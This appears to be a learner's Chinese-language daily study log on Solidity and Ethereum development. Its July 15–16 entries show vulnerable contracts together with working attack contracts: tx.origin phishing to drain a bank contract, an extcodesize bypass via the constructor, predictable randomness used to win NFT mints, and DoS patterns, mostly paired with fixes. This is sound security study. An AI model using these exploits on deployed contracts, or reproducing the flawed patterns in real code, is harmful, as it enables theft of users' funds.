---
timezone: UTC+8
---

# Gamla

**GitHub ID:** GamlaNyx

**Telegram:** 

## Self-introduction

Beneath bright daylight skies, flowers bloom freely.

## Notes

<!-- Content_START -->
# 2026-07-16
<!-- DAILY_CHECKIN_2026-07-16_START -->
2026.7.16

## `tx.origin`**钓鱼攻击**

如果一个合约用`tx.origin`做身份验证，那么黑客就有可能先部署一个攻击合约，然后再诱导合约的拥有者调用，即使`msg.sender`是攻击合约地址，但`tx.origin`是银行合约拥有者地址，因此用`tx.origin`作身份验证较为危险

**漏洞合约：**

```
 contract Bank {
     address public owner;
 ​
     constructor() payable {
         owner = msg.sender;
     }
 ​
     function transfer(address payable _to, uint _amount) public {
         //危险漏洞，tx.origin作身份验证可能被钓鱼攻击
         require(tx.origin == owner, "Not owner");
         //转账ETH
         (bool sent, ) = _to.call{value: _amount}("");
         require(sent, "Failed to send Ether");
     }
 }
```

**攻击合约**

```
 contract Attack {
     // 受益者地址
     address payable public hacker;
     // Bank合约地址
     Bank bank;
 ​
     constructor(Bank _bank) {
         //强制将address类型的_bank转换为Bank类型
         bank = Bank(_bank);
         //将受益者地址赋值为部署者地址
         hacker = payable(msg.sender);
     }
 ​
     function attack() public {
         //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中
         bank.transfer(hacker, address(bank).balance);
     }
 }
```

**预防：**

使用`msg.sender`代替`tx.origin`

```
 function transfer(address payable _to, uint256 _amount) public {
   require(msg.sender == owner, "Not owner");
 ​
   (bool sent, ) = _to.call{value: _amount}("");
   require(sent, "Failed to send Ether");
 }
```

或检测`tx.origin == msg.sender`

```
     function transfer(address payable _to, uint _amount) public {
         require(tx.origin == owner, "Not owner");
         require(tx.origin == msg.sender, "can't call by external contract");
         (bool sent, ) = _to.call{value: _amount}("");
         require(sent, "Failed to send Ether");
     }
```

## **绕过合约长度检查**

有一个判断调用者是外部账户（EOA）还是合约的方法，通过`extcodesize`获取该地址所储存的`bytecode`长度，若大于0，则判断为合约

**例：**

```
 // 利用 extcodesize 检查是否为合约
 function isContract(address account) public view returns (bool) {
     // extcodesize > 0 的地址一定是合约地址
     // 但是合约在构造函数时候 extcodesize 为0
     uint size;
     assembly {
         size := extcodesize(account)
     }
     return size > 0;
 }
```

但有个漏洞，合约未被完全创建的时候，`runtime bytcode`未被存储到地址上，此时`bytecode`也为0，所以我们将逻辑写在构造函数中（合约未被创建完成），也可以骗过这个函数`size = 0`

**漏洞合约：**

```
 // 用extcodesize检查是否为合约地址
 contract ContractCheck is ERC20 {
     // 构造函数：初始化代币名称和代号
     constructor() ERC20("", "") {}
     
     // 利用 extcodesize 检查是否为合约
     function isContract(address account) public view returns (bool) {
         // extcodesize > 0 的地址一定是合约地址
         // 但是合约在构造函数时候 extcodesize 为0
         uint size;
         assembly {
             size := extcodesize(account)
         }
         return size > 0;
     }
 ​
     // mint函数，只有非合约地址能调用（有漏洞）
     function mint() public {
         require(!isContract(msg.sender), "Contract not allowed!");
         _mint(msg.sender, 100);
     }
 }
```

**攻击合约：**

```
 // 利用构造函数的特点攻击
 contract NotContract {
     bool public isContract;
     address public contractCheck;
 ​
     // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。
     constructor(address addr) {
         contractCheck = addr;
         isContract = ContractCheck(addr).isContract(address(this));
         // This will work
         for(uint i; i < 10; i++){
             ContractCheck(addr).mint();
         }
     }
 ​
     // 合约创建好以后，extcodesize > 0，isContract() 可以检测
     function mint() external {
         ContractCheck(contractCheck).mint();
     }
 }
```

## **未检查的低级调用**

solidity中，失败的低级调用不会让交易回滚

### **低级调用**

以太坊的低级调用：`call()`，`delegatecall()`，`staticcall()`，`send()`

当他们出现异常时，并不会向上传递，不会导致交易完全回滚，只会返回一个布尔值`false`

```
 contract UncheckedBank {
     mapping (address => uint256) public balanceOf;    // 余额mapping
 ​
     // 存入ether，并更新余额
     function deposit() external payable {
         balanceOf[msg.sender] += msg.value;
     }
 ​
     // 提取msg.sender的全部ether
     function withdraw() external {
         // 获取余额
         uint256 balance = balanceOf[msg.sender];
         require(balance > 0, "Insufficient balance");
         balanceOf[msg.sender] = 0;
         // Unchecked low-level call
         bool success = payable(msg.sender).send(balance);
     }
 ​
     // 获取银行合约的余额
     function getBalance() external view returns (uint256) {
         return address(this).balance;
     }
 }
```

`withdraw()`函数的`.send`没有检查`success`，但如果用户无法接收转账，`withdraw()`却可以正常调用，余额清空但提款失败

## **DoS攻击**

**_\###_ 外部调用阻塞DoS**

`transfer()`/`send()`仅支持2300 gas，若接收方恶意，`fallback()`/`receive()`内部主动revert，业务的循环遍历逻辑就会直接失败，所有用户都无法拿到资金，永久阻塞分发逻辑

**漏洞合约：**

```
 // 危险：批量循环transfer
 contract Dividend {
     address[] public users;
 ​
     function distribute() external {
         // 遍历所有用户批量发分红
         for(uint i=0; i<users.length; i++){
             // 恶意合约接收时直接revert，整轮循环中断
             payable(users[i]).transfer(1 ether);
         }
     }
 }
```

**解决方案：**

1.  pull取款模式，合约不主动转账，用户自行调用`withdraw()`提取资金
    
2.  使用低gas兼容的`call{value: amount}("")`，捕获失败，跳过恶意地址
    

### **循环数组遍历Gas爆炸DoS**

合约数组无长度限制，攻击者大量填充数组，遍历数组时Gas超出区块Gas上限，交易失败

```
 contract Lottery {
     address[] public players;
 ​
     // 无上限入队
     function join() external payable {
         players.push(msg.sender);
     }
 ​
     // 开奖需要遍历全部玩家，数组过大直接Gas超限
     function draw() external {
         uint total = players.length;
         for(uint i=0; i<total; i++){
             // 复杂计算消耗大量gas
         }
     }
 }
```

**解决方案：**

1.  限制数组最大长度
    
2.  分页遍历，增加索引参数，单次只遍历一小段，分多笔交易完成遍历
    
3.  改用`mapping(address => bool)`存储，避免线性遍历
<!-- DAILY_CHECKIN_2026-07-16_END -->

# 2026-07-15
<!-- DAILY_CHECKIN_2026-07-15_START -->

2026.7.15

## **整数溢出**

`uint256`无符号256位整数，取值 0 ~2^{256}-1

Solidity0.8.0才引入内置算法溢出自动回滚

**uint256上溢：**

uint256 加法溢出公式：a + b = (a + b) \\bmod 2^{256}

**uint256下溢：**

公式：a - b = (a - b + 2^{256}) \\bmod 2^{256}

## **坏随机数**

以太坊上所有数据均公开透明，链上通常来说无法产生真正的随机数，链上的随机数可以被攻击者事先计算出结果，不安全

带有坏随机数的NFT合约：

```
 contract BadRandomness is ERC721 {
     uint256 totalSupply;
 ​
     // 构造函数，初始化NFT合集的名称、代号
     constructor() ERC721("", ""){}
 ​
     // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint
     function luckyMint(uint256 luckyNumber) external {
         uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number
         require(randomNumber == luckyNumber, "Better luck next time!");
 ​
         _mint(msg.sender, totalSupply); // mint
         totalSupply++;
     }
 }
```

攻击合约`Attack.sol`

```
 contract Attack {
     function attackMint(BadRandomness nftAddr) external {
         // 提前计算随机数
         uint256 luckyNumber = uint256(
             keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
         ) % 100;
         // 利用 luckyNumber 攻击
         nftAddr.luckyMint(luckyNumber);
     }
 }
```
<!-- DAILY_CHECKIN_2026-07-15_END -->

# 2026-07-14
<!-- DAILY_CHECKIN_2026-07-14_START -->


2026.7.14

## **Solidity类型转换**

主要是bytes和uint

### **字节与位**

1字节（byte） = 8位（bit）

位：最小的存储单位

bytes1 => 1字节 = 8位

### **定长bytes**

bytes4 = 4字节

bytes20 = 20字节

bytes32 = 32字节（最长的定长字节类型，独占一个储存槽）

**十六进制字面量**

每2个十六进制字符 = 1字节

### **大端序与高低位**

bytes与uint相互转换时，统一遵循大端序

-   字节数组左侧为高位，右侧为低位
    

对于 `bytes4 b = 0x11223344`：

-   索引 0 → `0x11` → 最高字节（第 3 个字节，对应数值高 8 位）
    
-   索引 1 → `0x22` → 次高字节
    
-   索引 2 → `0x33` → 次低字节
    
-   索引 3 → `0x44` → 最低字节（对应数值低 8 位）
    

### **bytes<=>uint**

**窄 => 宽**

```
 bytes2 b = 0x1234;
 uint32 u = uint32(uint16(b)); // 先转 uint16，再隐式补位到 uint32
 // 结果 u = 0x00001234
```

**宽 => 窄**

bytes

```
 bytes2 b2 = 0x1122;
 bytes4 b4 = bytes4(b2);   // 短转长：右侧补0 → 0x11220000
 ​
 bytes4 b4_2 = 0x11223344;
 bytes2 b2_2 = bytes2(b4_2); // 长转短：右侧截断 → 0x1122
```

uint

```
 uint16 u16 = 0x1122;
 uint32 u32 = uint32(u16);   // 短转长：高位补0 → 0x00001122
 ​
 uint32 u32_2 = 0x11223344;
 uint16 u16_2 = uint16(u32_2); // 长转短：高位截断 → 0x3344
```

## **Solidity私有变量的访问**

`private` 只是**Solidity 编译器层面的访问限制**，作用是防止合约代码误读写私有变量、约束代码边界；

所有状态变量最终都存储在区块链的「世界状态」中，每个合约对应独立的存储树，数据对全网所有节点透明；

任何人都可以通过以太坊 RPC 的 `eth_getStorageAt` 接口，读取任意合约的任意存储槽，`private` 变量也不例外

### **Solidity存储槽布局**

按声明顺序，从`slot 0`开始分配，一个`slot`32字节

**静态变量**

单个变量占满 32 字节（如 `uint256`、`bytes32`），独占一个槽；

小于 32 字节的变量（如 `uint8`、`bool`、`uint128`）会**打包进同一个槽**，从槽的最低有效位（最右侧）开始依次排列，以节省 Gas。

**动态类型变量**

数组、映射、`string`/`bytes` 等动态大小类型，无法按固定顺序排布，需要通过哈希计算实际存储位置：

**动态数组**

数组本身的槽存储数组长度；

数组元素的起始槽 = `keccak256(abi.encode(slot))`

第`i`个元素的槽 = 起始槽+`i`

**映射mapping**

映射本身的槽不存储有效数据

键对应的储存槽 = `keccak256(abi.encode(key, slot))`

**string/bytes**

长度<=31：数据存在当前槽，最后一字节存储`长度*2`

长度>=31：当前槽存储`长度 * 2 + 1`，实际数据存在`keccak(slot)`起始的连续槽中

### **cast storage**

```
 cast storage [选项] <合约地址> <槽号>
```

参数： `--rpc-url <URL>` 指定RPC节点

`-B, --block <区块号>`读取指定高度的历史存储

`--json` 以JSON格式输出结果
<!-- DAILY_CHECKIN_2026-07-14_END -->

# 2026-07-08
<!-- DAILY_CHECKIN_2026-07-08_START -->



## **7.8**

跟着实习手册重新学习了Solidity，并用Solidity写了几个简单的合约作为练习:

```
 //SPDX-Lincense-Identifier: MIT
 pragma solidity ^0.8.20;
 ​
 contract UserInfo {
     uint256 public age = 0;
     string private name;
     function setAge(uint256 _age) public {
         age = _age;
     }
 ​
     function setName(string calldata _name) public {
         name = _name;
     }
 ​
     function getName() public view returns(string memory) {
         return name;
     }
 }
 ​
 contract BalanceRecode {
     mapping(address => uint256) public userBalance;
 ​
     function deposit() public payable {
         userBalance[msg.sender] += msg.value;
     }
 ​
     function withdraw(uint256 amount) public {
         require(userBalance[msg.sender] >= amount, "Insefficient balance");
         userBalance[msg.sender] -= amount;
         payable(msg.sender).transfer(amount);
     }
 }
 ​
 contract AdminBox {
     address public owner;
     uint256 public data = 100;
     
     constructor() {
         owner = msg.sender;
     }
 ​
     modifier onlyOwner {
         require(msg.sender == owner, "ont owner");
         _;
     }
 ​
     function setData(uint256 _data) public onlyOwner {
         data = _data;
     }
 ​
     function getData() public view returns(uint256) {
         return data;
     }
 }
 ​
 contract NumberList {
     uint[] public nums;
 ​
     function addNum(uint num) public {
         nums.push(num);
     }
 ​
     function getSum() public view returns(uint256 total) {
         total = 0;
         for(uint i = 0; i < nums.length; i++) {
             total += nums[i];
         }
         return total;
     }
 ​
     function clearAll() public {
         delete nums;
     }
 }
```

### **数据类型**

数字：

1.  常用uint256类型，无符号
    
2.  uint8，一字节，0~256
    

字符串：string，UTF-8编码

固定长度字节数组：bytes1~bytes32

动态字节数组：bytes

### **修饰符**

可见性修饰符（必）

| 修饰符 | 可见范围 | 描述 | 使用场景 |
| --- | --- | --- | --- |
| public | 内部 + 外部 | 任何地方都可以调用 | 对外提供的公共接口 |
| external | 仅外部 | 只能从合约外部调用 | 外部用户接口，gas 效率更高 |
| internal | 内部 + 继承 | 当前合约和子合约可调用 | 内部逻辑函数，需要被继承 |
| private | 仅内部 | 只有当前合约可调用 | 私有实现细节 |

状态修饰符：

无：正常，可以读取和修改

payable：在正常的基础上可以接受以太币

view：可以读取状态，但不改变状态

pure：既无法读取也无法修改

### **合约结构**

```
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 ​
 contract MyContract {
     // 状态变量
     uint256 public myNumber;
 ​
     // 构造函数
     constructor() {
         myNumber = 100;
     }
 ​
     // 函数
     function setNumber(uint256 _number) public {
         myNumber = _number;
     }
 }
```
<!-- DAILY_CHECKIN_2026-07-08_END -->

# 2026-07-07
<!-- DAILY_CHECKIN_2026-07-07_START -->




## **2026.7.7**

今天稍微有点忙，看了今天Jackcc.eth老师和41老师的开发者如何进入以太坊协议层的回放，对照web3实习手册看了些智能合约开发的相关知识

### **Dapp框架**

-   前端
    
-   智能合约
    
-   数据检索器
    
-   区块链和去中心化存储
    

### **Dapp开发流程**

-   需求分析
    
-   智能合约开发
    
-   前端开发
    
-   与智能合约交互
    
-   部署与上线
    

### **以太坊开发环境**

**基础环境：**

-   Node,js
    
-   npm
    
-   Git
    

**以太坊本地开发链**

**Foundry**

Foundry提供的工具

-   forge：构建、测试、调试、部署、验证等
    
-   anvil：本地开发节点
    
-   cast：命令行工具
    

**Hardhat**

```
 npm install --global hardhat
 mkdir eth-dev && cd eth-dev
 npx hardhat
```

启动本地节点

```
 npx hardhat node
```

部署合约

```
 npx hardhat run scripts/deploy.js --network localhost
```

### **RPC**

**RPC**（Remote Procedure Call，远程过程调用），是一种通信协议，允许应用程序通过网络调用远程服务器上的函数或方法

**RPC作用：**

-   读取链上数据
    
-   发送交易
    
-   事件监听
    
-   网络管理
    

**JSON-RPC**

以太坊传输数据的格式：JSON

**基本请求格式：**

```
 {
   "jsonrpc": "2.0",
   "method": "eth_getBalance",
   "params": ["0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045", "latest"],
   "id": 1
 }
```

**基本响应格式**

```
 {
   "jsonrpc": "2.0",
   "id": 1,
   "result": "0x1bc16d674ec80000"
 }
```

**常用 JSON-RPC 方法：**

| 方法名 | 功能 | 示例 |
| --- | --- | --- |
| eth_getBalance | 查询账户余额 | eth_getBalance(address, block) |
| eth_blockNumber | 获取最新区块号 | eth_blockNumber() |
| eth_sendTransaction | 发送交易 | eth_sendTransaction(txObject) |
| eth_call | 调用合约（只读） | eth_call(callObject, block) |
| eth_getTransactionReceipt | 获取交易收据 | eth_getTransactionReceipt(txHash) |
| eth_getLogs | 查询事件日志 | eth_getLogs(filterObject) |

**主流RPC服务商：**

Alchemy：每月3亿请求，稳定性高，适用生产环境企业应用

...
<!-- DAILY_CHECKIN_2026-07-07_END -->
<!-- Content_END -->
